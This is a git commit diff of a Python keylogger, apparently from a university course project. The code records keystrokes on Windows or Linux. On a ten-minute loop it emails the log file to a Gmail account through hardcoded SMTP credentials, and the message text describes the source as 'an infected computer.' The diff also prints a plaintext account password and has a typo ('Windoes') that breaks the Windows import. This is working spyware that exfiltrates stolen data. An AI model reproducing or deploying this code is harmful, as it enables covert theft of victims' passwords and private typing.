55ca619c7d6eef7f3d769c26ae0bde5fc6549f8c
TRS5887 <47867979+TRS5887@users.noreply.github.com>
2019-04-05 20:21:03 -0400

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -40,13 +40,22 @@ except ImportError:
   os.system('python -m pip install email')
 import email
 
+mySystem = platform.system()
+if mySystem == ('Windows'):
+   try:
+     import pynput
+   except ImportError:
+     os.system('python -m pip install pynput')
+   import pynput
+
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from pynput.keyboard import Key, Listener
+if mySystem == ('Windoes'):
+   from pynput.keyboard import Key, Listener
 
-mySystem = platform.system()
+
 if mySystem == ('Linux'):
     import pyxhook
 
@@ -59,10 +68,10 @@ if(mySystem) == ('Windows'):
     userDirPath += windowsExtraPath
     if not os.path.exists(userDirPath):
         os.makedirs(userDirPath)
-if(mySystem) == ('Linux'):
-    userDirPath += linuxExtraPath
-    if not os.path.exists(userDirPath):
-        os.makedirs(userDirPath)
+#if(mySystem) == ('Linux'):
+    #userDirPath += linuxExtraPath
+    #if not os.path.exists(userDirPath):
+        #os.makedirs(userDirPath)
 
 
 starttime = time.time()
@@ -70,42 +79,47 @@ starttime = time.time()
 # This will send the log file to the specified email account 
 # at the time interval specified.
 def sendEmail():
-    while True:
-        curDir = os.get_exec_path
-        email_user = 'csci455keylog@gmail.com'
-        email_password = 'Keylog Account!'
-        email_send = 'csci455keylog@gmail.com'
+   while True:
+       curDir = os.get_exec_path
+       email_user = 'csci455keylog@gmail.com'
+       email_password = 'Keylog Account!'
+       email_send = 'csci455keylog@gmail.com'
 
-        subject = 'Log from: ' + str(userDirPath) + " at " + str(datetime.datetime.now())
+       subject = 'Log from: ' + str(userDirPath) + " at " + str(datetime.datetime.now())
 
-        msg = MIMEMultipart()
-        msg['From'] = email_user
-        msg['To'] = email_send
-        msg['Subject'] = subject
+       msg = MIMEMultipart()
+       msg['From'] = email_user
+       msg['To'] = email_send
+       msg['Subject'] = subject
 
-        body = 'This email contains a key log file from an infected computer.'
-        msg.attach(MIMEText(body,'plain'))
+       body = 'This email contains a key log file from an infected computer.'
+       msg.attach(MIMEText(body,'plain'))
 
-        #filename= os.getcwd() + 'key_log.txt'
-        filename = userDirPath + 'key_log.txt'
-        # Add log file path to open or filename
-        attachment  = open(filename,'rb')
+       #filename= os.getcwd() + 'key_log.txt'
+       
+       # Add log file path to open or filename
+       if mySystem == ('Windows'):
+          filename = userDirPath + 'key_log.txt'
+          attachment  = open(filename,'rb')
+       else:
+          filename = 'key_log.txt'
+          attachment = open('/home/student/Desktop/file.log','rb')
 
-        part = MIMEBase('application','octet-stream')
-        part.set_payload((attachment).read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition',"attachment; filename= "+filename)
+       part = MIMEBase('application','octet-stream')
+       part.set_payload((attachment).read())
+       encoders.encode_base64(part)
+       part.add_header('Content-Disposition',"attachment; filename= "+filename)
 
-        msg.attach(part)
-        text = msg.as_string()
-        server = smtplib.SMTP('smtp.gmail.com',587)
-        server.starttls()
-        server.login(email_user,email_password)
+       msg.attach(part)
+       text = msg.as_string()
+       server = smtplib.SMTP('smtp.gmail.com',587)
+       server.starttls()
+       server.login(email_user,email_password)
 
 
-        server.sendmail(email_user,email_send,text)
-        server.quit()
-        time.sleep(600.0 - ((time.time() - starttime) % 60.0))
+       server.sendmail(email_user,email_send,text)
+       server.quit()
+       time.sleep(600.0 - ((time.time() - starttime) % 60.0))
 
 #execute windows keylogger
 if mySystem == 'Windows':
@@ -122,7 +136,8 @@ if mySystem == 'Windows':
 #execute linux keylogger
 elif mySystem == 'Linux':
     #change this to the log file's path
-    log_file = userDirPath + "key_log.txt"
+    #log_file = userDirPath + "key_log.txt"
+    log_file = '/home/student/Desktop/file.log'
     #this function is called every time a key is pressed
     def OnKeyPress(event):
         fob = open(log_file,'a')
